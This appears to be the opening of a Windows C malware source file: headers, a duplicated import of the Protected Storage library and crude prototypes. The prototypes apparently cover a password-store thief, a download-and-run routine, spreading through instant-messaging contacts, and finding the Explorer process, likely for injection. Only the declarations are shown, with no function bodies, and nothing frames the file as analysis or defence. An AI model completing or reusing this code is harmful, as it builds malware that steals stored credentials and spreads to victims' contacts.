#define _WIN32_WINNT 0x0501
#define NO_STRICT
#include <malloc.h>
#include <stdio.h>
#include <stdlib.h>
#include <comutil.h>
#include <time.h>
#include <windows.h>
#import "pstorec.dll" no_namespace
#include <conio.h>    
#include <string.h>   
#include <wininet.h>
#include <winsock.h> // socket
#include <shlobj.h>
#include <ctype.h> 
#include <tchar.h>
#include <winable.h> 
#include "extern.h"

#import "pstorec.dll" no_namespace
#include "Psapi.h" 
#pragma comment(lib,"psapi.lib") 
 
char *rndx(int size);
int getthisshit(char *link,char *exxe);
void imfuck();
void contactfuck(char *contact);
DWORD WINAPI pstore (LPVOID param);
DWORD GetExplorerProcessID (void);
